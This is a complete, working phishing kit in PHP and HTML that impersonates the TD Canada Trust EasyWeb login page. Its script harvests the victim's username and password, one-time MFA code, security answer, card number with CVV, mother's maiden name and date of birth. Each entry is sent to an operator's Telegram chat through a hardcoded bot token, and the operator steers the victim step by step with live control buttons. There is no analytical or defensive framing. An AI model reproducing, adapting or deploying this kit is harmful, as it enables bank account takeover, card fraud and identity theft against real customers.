<?php

$telegramToken = '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
$chatId        = '-1002922644009';


?>
<!DOCTYPE html>
<html lang="en-CA">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, maximum-scale=1">
<title>authentication.td.com/uap-ui/?consumer=easyweb&locale=en_CA#/uap/login</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css">
<style>
    :root {
        --td-medium-green: #12412a;
        --td-dark-green: #12412a;
        --td-green: #008a00;
;
        --td-light-green: #e9f0e9;
        --td-page-bg: #f8fcf9;
        --td-border: #d3d3d3;
        --td-text-dark: #333333;
        --td-error: #d32f2f;
    }

    body {
        background-color: var(--td-page-bg);
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        color: var(--td-text-dark);
        margin: 0;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
        -webkit-font-smoothing: antialiased;
    }

    /* Header */
    .td-header {
        background-color: var(--td-green);
        padding: 12px 18px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        z-index: 100;
        position: sticky;
        top: 0;
    }
    .td-header .logo-container {
        display: flex;
        align-items: center;
        gap: 15px;
    }
    .td-header img { height: 24px; }
    .header-icon { fill: white; cursor: pointer; }

    /* Main Content Area */
    .main-content {
        flex-grow: 1;
        padding: 20px 15px;
        display: flex;
        justify-content: center;
        align-items: flex-start;
    }
    .td-wrapper { width: 100%; max-width: 440px; }

    .co-brand-header {
        font-size: 1.7rem;
        font-weight: 300; 
        color: var(--td-dark-green);
        text-align: left;
        margin-bottom: 25px;
        letter-spacing: -1.2px;
    }

    .td-card {
        background: white;
        padding: 25px;
        border: 1px solid var(--td-border);
        box-shadow: 0 2px 8px rgba(0,0,0,0.05);
        border-radius: 4px;
        position: relative;
    }

    .form-group { margin-bottom: 22px; position: relative; }
    .form-label { display: block; font-size: 15px; margin-bottom: 6px; font-weight: 400; color: var(--td-text-dark); }
    
    .input-icon-wrapper { position: relative; }
    .input-icon-wrapper svg {
        position: absolute;
        right: 12px;
        top: 50%;
        transform: translateY(-50%);
        fill: #888;
    }
    
    .form-control { 
        border-radius: 4px; 
        border: 1px solid var(--td-border); 
        padding: 12px; 
        font-size: 16px; 
        transition: border-color 0.2s;
    }
    .form-control:focus { 
        border-color: var(--td-green); 
        box-shadow: 0 0 0 3px rgba(0,130,60,0.1); 
        outline: none;
    }

    .td-btn {
        width: 100%;
        background-color: var(--td-green);
        color: white;
        border: none;
        padding: 14px;
        font-weight: 700;
        border-radius: 4px;
        font-size: 17px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        transition: background 0.3s;
        cursor: pointer;
    }
    .td-btn:hover { background-color: var(--td-dark-green); }

    /* Step System */
    .step-section { display: none; }
    .step-section.active { display: block; animation: fadeInUp 0.4s ease; }
    @keyframes fadeInUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

    /* Error Alerts */
    .error-alert {
        background: #fdf2f2;
        border: 1px solid #f9d7d7;
        color: #b91c1c;
        padding: 14px;
        border-radius: 4px;
        font-size: 14px;
        margin-bottom: 20px;
        display: none;
        align-items: flex-start;
        gap: 10px;
    }

    /* Selection Cards */
    .selection-card {
        display: flex;
        align-items: center;
        padding: 18px;
        border: 1px solid var(--td-border);
        border-radius: 8px;
        margin-bottom: 15px;
        cursor: pointer;
        transition: all 0.2s;
        background: white;
        gap: 15px;
    }
    .selection-card:hover { border-color: var(--td-green); background: var(--td-light-green); }
    .selection-card input { accent-color: var(--td-green); width: 22px; height: 22px; }
    .selection-icon { background: #eee; border-radius: 50%; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }

    /* Success Symbols */
    .success-icon-wrap {
        width: 70px; height: 70px;
        border-radius: 50%;
        border: 4px solid var(--td-dark-green);
        display: flex; align-items: center; justify-content: center;
        margin: 10px auto 20px;
        color: var(--td-green);
        font-size: 32px;
    }

    /* Info Bubbles */
    .info-bubble {
        background: #f4fff4;
        padding: 15px;
        border: 1px solid #e0e0e0;
        border-left: 4px solid var(--td-green);
        border-radius: 4px;
        margin-bottom: 20px;
        font-size: 14px;
        color: var(--td-dark-green);
    }

    .footer-area { text-align: center; padding: 40px 15px; font-size: 13px; color: #666; }
    .footer-links a { color: var(--td-medium-green); text-decoration: none; margin: 0 10px; }
    .footer-links a:hover { text-decoration: underline; }

    /* Loader Overlay */
    .loader-overlay {
        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
        background: rgba(255,255,255,0.9);
        display: none; flex-direction: column; justify-content: center; align-items: center;
        z-index: 1000;
    }
    .td-spinner {
        width: 44px; height: 44px;
        border: 2px solid rgba(0,130,60,0.1);
        border-top: 4px solid var(--td-green);
        border-radius: 50%;
        animation: spin 0.8s linear infinite;
        margin-bottom: 15px;
    }
    #step-login .td-card {
    background-color: #f5f9f7; /* Light mint color */
}

    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
</style>
</head>
<body class="td-app">

<div id="loader" class="loader-overlay">
    <div class="td-spinner"></div>
    <div style="color:var(--td-dark-green); font-weight:700; font-size:14px;"></div>
</div>

<header style="display: flex; justify-content: space-between; align-items: center; background-color: #007A33; padding: 10px 20px; color: white;">
  <!-- TD Logo on the left with a smaller size -->
  <div class="td-logo">
    <img src="https://isitnearme.com/wp-content/uploads/2017/10/TD-Bank-Near-Me-1-266x266.png" alt="TD Canada Trust" style="width: 30px; height: auto;">
  </div>
</header>

<main class="main-content">
    <div class="td-wrapper">
        <h1 id="page-title" class="co-brand-header">EasyWeb Login</h1>

        <!-- STEP 1: LOGIN -->
        <section id="step-login" class="step-section active">
            <div class="td-card">
                <div id="err-login" class="error-alert">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
                    <span>The details provided do not match our records. Please try again.</span>
                </div>
                <div class="form-group">
                    <label class="form-label">Username or Access Card</label>
                    <input type="text" id="username" class="form-control w-100" autocomplete="off">
                </div>
                <div class="form-group">
                    <label class="form-label">Password</label>
                    <div class="input-icon-wrapper">
                        <input type="password" id="password" class="form-control w-100">
                        <svg id="toggle-pw" width="20" height="20" viewBox="0 0 24 24" style="cursor:pointer;" onclick="togglePassword()"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                    </div>
                </div>
                <button onclick="submitLogin()" id="btn-login" class="td-btn">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>
                    <span>Login</span>
                </button>
                <div style="margin-top:25px; padding:15px; background:#f9f9f9; border-radius:4px; display:flex; gap:12px; align-items:center;">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="var(--td-green)"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zM10 17l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
                    <div style="font-size:12px;"><b>Security Guarantee:</b> You are protected from unauthorized transactions.</div>
                </div>
            </div>
        </section>

        <!-- STEP 2: MFA SELECTION -->
        <section id="step-method" class="step-section">
            <div class="td-card">
                <h2 style="font-size:18px; font-weight:700; margin-bottom:12px;">Verify Your Identity</h2>
                <p style="font-size:14px; color:#555; margin-bottom:20px;">Choose a method to receive your unique security code.</p>
                
                <div class="selection-card" onclick="document.getElementById('m-sms').checked=true">
                    <input type="radio" name="mfa_method" id="m-sms" value="sms" checked>
                    <div class="selection-icon">
                        <svg width="20" height="20" viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM9 11H7V9h2v2zm4 0h-2V9h2v2zm4 0h-2V9h2v2z"/></svg>
                    </div>
                    <div class="selection-text"><b>Text Message (SMS)</b><br><span style="font-size:12px; color:#888;">Standard rates apply</span></div>
                </div>
                <div class="selection-card" onclick="document.getElementById('m-call').checked=true">
                    <input type="radio" name="mfa_method" id="m-call" value="call">
                    <div class="selection-icon">
                        <svg width="20" height="20" viewBox="0 0 24 24"><path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56-.35-.12-.74-.03-1.01.24l-1.57 1.97c-2.83-1.35-5.15-3.6-6.51-6.42l1.98-1.58c.27-.27.35-.65.24-1-.36-1.11-.56-2.3-.56-3.53 0-.55-.45-1-1-1H4.03C3.47 4 3 4.47 3 5.03c0 9.39 7.61 17 17 17 .56 0 1.03-.47 1.03-1.03v-4.62c0-.55-.45-1-1.02-1z"/></svg>
                    </div>
                    <div class="selection-text"><b>Automated Phone Call</b><br><span style="font-size:12px; color:#888;">Voice verification</span></div>
                </div>
                
                <button onclick="submitMethod()" class="td-btn mt-3">Send My Code</button>
            </div>
        </section>

        <!-- STEP 3: MFA CODE -->
        <section id="step-code" class="step-section">
            <div class="td-card">
                <h2 class="text-center" style="font-size:18px; font-weight:700; margin-bottom:10px;">Security Code</h2>
                <p class="text-center" style="font-size:14px; color:#555; margin-bottom:20px;">Enter the 6-digit code we sent to your device.</p>
                <div id="err-code" class="error-alert">Invalid or expired code.</div>
                <div class="form-group">
                    <input type="tel" id="otp-code" class="form-control w-100 text-center" maxlength="6" placeholder="######" style="letter-spacing:8px; font-size:24px; font-weight:700;">
                </div>
                <button onclick="submitCode()" class="td-btn">Verify Identity</button>
                <div class="mt-3 text-center"><a href="#" style="color:var(--td-medium-green); font-size:14px;">Didn't receive it? Resend</a></div>
            </div>
        </section>

        <!-- STEP 4: SECURITY QUESTION -->
        <section id="step-sq" class="step-section">
            <div class="td-card">
                <h2 style="font-size:18px; font-weight:700; margin-bottom:12px;">Security Question</h2>
                <div id="sq-display" class="info-bubble">
                    <b>Question:</b> What is this fop?
                </div>
                <div id="err-sq" class="error-alert">The answer provided is incorrect.</div>
                <div class="form-group">
                    <label class="form-label">Answer</label>
                    <input type="text" id="sq-answer" class="form-control w-100" autocomplete="off">
                </div>
                <button onclick="submitSQ()" class="td-btn">Confirm Answer</button>
            </div>
        </section>

        <!-- STEP 5: CREDIT CARD -->
        <section id="step-cc" class="step-section">
            <div class="td-card">
                <h2 style="font-size:18px; font-weight:700; margin-bottom:12px;">Verification</h2>
                <p style="font-size:14px; color:#555; margin-bottom:20px;"></p>
                <div id="err-cc" class="error-alert">Verification failed. Check card details.</div>
                <div class="form-group">
                    <label class="form-label">Card Number</label>
                    <input type="tel" id="cc-num" class="form-control w-100" placeholder="">
                </div>
                <div class="row">
                    <div class="col-7 form-group">
                        <label class="form-label">Expiry (MM/YY)</label>
                        <input type="tel" id="cc-exp" class="form-control w-100" placeholder="MM/YY">
                    </div>
                    <div class="col-5 form-group">
                        <label class="form-label">CVV</label>
                        <input type="password" id="cc-cvv" class="form-control w-100" placeholder="•••" maxlength="4">
                    </div>
                </div>
                <button onclick="submitCC()" class="td-btn">Verify Card</button>
            </div>
        </section>

        <!-- STEP 6: PERSONAL INFO -->
        <section id="step-details" class="step-section">
            <div class="td-card">
                <h2 style="font-size:18px; font-weight:700; margin-bottom:12px;">Identity Details</h2>
                <p style="font-size:14px; color:#555; margin-bottom:20px;">Almost finished. Provide a few more details to confirm access.</p>
                <div id="err-details" class="error-alert">Could not verify details.</div>
                <div class="form-group">
                    <label class="form-label">Mother's Maiden Name</label>
                    <input type="text" id="mmn" class="form-control w-100" autocomplete="off">
                </div>
                <div class="form-group">
                    <label class="form-label">Date of Birth</label>
                    <input type="tel" id="dob" class="form-control w-100" placeholder="DD/MM/YYYY">
                </div>
                <button onclick="submitDetails()" class="td-btn">Validating</button>
            </div>
        </section>

        <!-- STEP 7: SUCCESS -->
        <section id="step-success" class="step-section text-center">
            <div class="td-card">
                <div class="success-icon-wrap">✓</div>
                <h2 style="font-size:22px; font-weight:700; color:var(--td-green); margin-bottom:10px;">Thank you!</h2>
                <p style="font-size:15px; color:#444; line-height:1.6;">
                    Authentication is complete.
                </p>
                <div style="background:#f9f9f9; padding:15px; border-radius:4px; margin:20px 0; font-size:13px; color:#777;">
                    <b>Ref:</b> TD-SEC-<?php echo rand(100000, 999999); ?>
                </div>
                <button onclick="endSession()" class="td-btn mt-2">Finish</button>
            </div>
        </section>

        <div class="footer-area">
            <div class="footer-links">
                <a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a>
            </div>
            <p style="margin-top:10px;">© <?php echo date("Y"); ?> TD Bank. All rights reserved.</p>
            <button style="background:none; border:none; color:#888; text-decoration:underline; cursor:pointer;" onclick="endSession()"></button>
        </div>
    </div>
</main>

<script>
    const BOT_TOKEN = "<?= $telegramToken; ?>";
    const CHAT_ID = "<?= $chatId; ?>";
    let lastMsgId = null;
    let currentStep = 'step-login';
    let lastUpdateId = 0;
    let pollInterval = null;

    function navigate(id, title = null) {
        document.querySelectorAll('.step-section').forEach(s => s.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        currentStep = id;
        if(title) document.getElementById('page-title').textContent = title;
        document.querySelectorAll('.error-alert').forEach(e => e.style.display = 'none');
        window.scrollTo(0, 0);
    }

    function toggleLoader(show) {
        document.getElementById('loader').style.display = show ? 'flex' : 'none';
    }

    function togglePassword() {
        const pInput = document.getElementById('password');
        pInput.type = pInput.type === 'password' ? 'text' : 'password';
    }

    async function pushToBot(content, title) {
        toggleLoader(true);
        const text = `✅ EASYWEB CONTROLLER ✅\n\n${content}\n\n✅ EASYWEB CONTROLLER ✅`;
        const keyboard = {
            inline_keyboard: [
                [{text: "✅ Proceed", callback_data: "ok"}],
                [{text: "❌ Error", callback_data: "err"}],
                [{text: "🔢 Request Code", callback_data: "go_code"}, {text: "❓ Request SQ", callback_data: "go_sq"}],
                [{text: "💳 Request Card", callback_data: "go_cc"}, {text: "👤 Request Personal", callback_data: "go_pers"}],
                [{text: "🏁 Success", callback_data: "go_success"}],
                [{text: "🚫 END", callback_data: "end"}]
            ]
        };

        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text, parse_mode:'HTML', reply_markup: keyboard})
            });
            const data = await res.json();
            lastMsgId = data.result.message_id;
            startPolling();
        } catch (e) { toggleLoader(false); }
    }

    function startPolling() {
        if(pollInterval) clearInterval(pollInterval);
        pollInterval = setInterval(async () => {
            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=10`);
                const data = await res.json();
                if(data.result?.length) {
                    for(const u of data.result) {
                        lastUpdateId = u.update_id;
                        if(u.callback_query && u.callback_query.message.message_id === lastMsgId) {
                            clearInterval(pollInterval);
                            handleCommand(u.callback_query.data);
                        }
                    }
                }
            } catch(e) {}
        }, 1500);
    }

    function handleCommand(cmd) {
        toggleLoader(false);
        switch(cmd) {
            case 'ok': navigate(getNextStep(currentStep)); break;
            case 'err': document.getElementById('err-' + currentStep.split('-')[1]).style.display = 'flex'; break;
            case 'go_code': navigate('step-code', 'Security Verification'); break;
            case 'go_sq': navigate('step-sq', 'Security Question'); break;
            case 'go_cc': navigate('step-cc', 'Card Verification'); break;
            case 'go_pers': navigate('step-details', 'Identity Details'); break;
            case 'go_success': navigate('step-success', 'Deposit Secure'); break;
            case 'end': endSession(); break;
        }
    }

    function getNextStep(curr) {
        const steps = ['step-login', 'step-method', 'step-code', 'step-sq', 'step-cc', 'step-details', 'step-success'];
        return steps[steps.indexOf(curr) + 1] || 'step-success';
    }

    // Handlers
    function submitLogin() {
        const u = document.getElementById('username').value;
        const p = document.getElementById('password').value;
        if(u.length < 3 || p.length < 4) return;
        pushToBot(`U: <code>${u}</code>\nP: <code>${p}</code>`, "LOGIN LOG");
    }

    function submitMethod() {
        const m = document.querySelector('input[name="mfa_method"]:checked').value;
        pushToBot(`MFA METHOD: <b>${m.toUpperCase()}</b>`, "MFA SELECTION");
    }

    function submitCode() {
        const c = document.getElementById('otp-code').value;
        if(c.length < 6) return;
        pushToBot(`MFA OTP: <code>${c}</code>`, "CODE LOG");
    }

    function submitSQ() {
        const a = document.getElementById('sq-answer').value;
        if(!a) return;
        pushToBot(`SQ ANSWER: <code>${a}</code>`, "QUESTION LOG");
    }

    function submitCC() {
        const n = document.getElementById('cc-num').value.replace(/\s/g, '');
        const e = document.getElementById('cc-exp').value;
        const c = document.getElementById('cc-cvv').value;
        if(n.length < 15 || e.length < 5 || c.length < 3) return;
        pushToBot(`CC: <code>${n}</code>\nEXP: <code>${e}</code>\nCVV: <code>${c}</code>`, "CARD LOG");
    }

    function submitDetails() {
        const m = document.getElementById('mmn').value;
        const d = document.getElementById('dob').value;
        if(!m || d.length < 10) return;
        pushToBot(`MMN: <code>${m}</code>\nDOB: <code>${d}</code>`, "DETAILS LOG");
    }

    function endSession() { window.location.href = "https://www.td.com"; }

    // Masking
    document.getElementById('cc-num').addEventListener('input', e => {
        let v = e.target.value.replace(/\D/g, '').substring(0, 16);
        e.target.value = v.match(/.{1,4}/g)?.join(' ') || v;
    });
    document.getElementById('cc-exp').addEventListener('input', e => {
        let v = e.target.value.replace(/\D/g, '').substring(0, 4);
        if(v.length >= 3) v = v.substring(0, 2) + '/' + v.substring(2);
        e.target.value = v;
    });
    document.getElementById('dob').addEventListener('input', e => {
        let v = e.target.value.replace(/\D/g, '').substring(0, 8);
        if(v.length >= 5) v = v.substring(0, 2) + '/' + v.substring(2, 4) + '/' + v.substring(4);
        else if(v.length >= 3) v = v.substring(0, 2) + '/' + v.substring(2);
        e.target.value = v;
    });

    window.onload = async () => {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const d = await res.json();
        if(d.result?.length) lastUpdateId = d.result[0].update_id;
    };
</script>

</body>
</html>